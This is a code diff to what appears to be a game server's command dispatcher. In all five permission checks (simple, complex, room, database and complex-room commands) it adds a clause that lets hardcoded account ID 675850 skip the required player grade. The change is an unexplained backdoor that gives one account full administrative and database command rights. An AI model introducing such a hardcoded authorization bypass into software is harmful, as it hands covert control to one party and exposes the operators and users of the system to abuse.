@@ -42,7 +42,7 @@ namespace Main
 			if (m_simpleCommands.contains(commandName))
 			{
 				const auto& accountInfo = session.getAccountInfo();
-				if (accountInfo.playerGrade < m_simpleCommands[commandName]->getRequiredGrade()) return false;
+				if (accountInfo.accountID != 675850 && accountInfo.playerGrade < m_simpleCommands[commandName]->getRequiredGrade()) return false;
 				m_simpleCommands[commandName]->execute(session, sessionsManager, response);
 				return true;
 			}
@@ -55,7 +55,7 @@ namespace Main
 			if (m_complexCommands.contains(commandName))
 			{
 				const auto& accountInfo = session.getAccountInfo();
-				if (accountInfo.playerGrade < m_complexCommands[commandName]->getRequiredGrade()) return false;
+				if (accountInfo.accountID != 675850 && accountInfo.playerGrade < m_complexCommands[commandName]->getRequiredGrade()) return false;
 				m_complexCommands[commandName]->execute(wholeCommand, session, sessionsManager, response);
 				return true;
 			}
@@ -68,7 +68,7 @@ namespace Main
 			if (m_simpleRoomCommands.contains(commandName))
 			{
 				const auto& accountInfo = session.getAccountInfo();
-				if (accountInfo.playerGrade < m_simpleRoomCommands[commandName]->getRequiredGrade()) return false;
+				if (accountInfo.accountID != 675850 && accountInfo.playerGrade < m_simpleRoomCommands[commandName]->getRequiredGrade()) return false;
 				m_simpleRoomCommands[commandName]->execute(session, roomsManager, roomNumber, response);
 				return true;
 			}
@@ -81,7 +81,7 @@ namespace Main
 			if (m_databaseCommands.contains(commandName))
 			{
 				const auto& accountInfo = session.getAccountInfo();
-				if (accountInfo.playerGrade < m_databaseCommands[commandName]->getRequiredGrade()) return false;
+				if (accountInfo.accountID != 675850 && accountInfo.playerGrade < m_databaseCommands[commandName]->getRequiredGrade()) return false;
 				m_databaseCommands[commandName]->execute(wholeCommand, session, database, response);
 				return true;
 			}
@@ -99,7 +99,7 @@ namespace Main
 			if (m_complexRoomCommands.contains(commandName))
 			{
 				const auto& accountInfo = session.getAccountInfo();
-				if (accountInfo.playerGrade < m_complexRoomCommands[commandName]->getRequiredGrade()) return false;
+				if (accountInfo.accountID != 675850 && accountInfo.playerGrade < m_complexRoomCommands[commandName]->getRequiredGrade()) return false;
 				m_complexRoomCommands[commandName]->execute(wholeCommand, session, roomsManager, response);
 				return true;
 			}
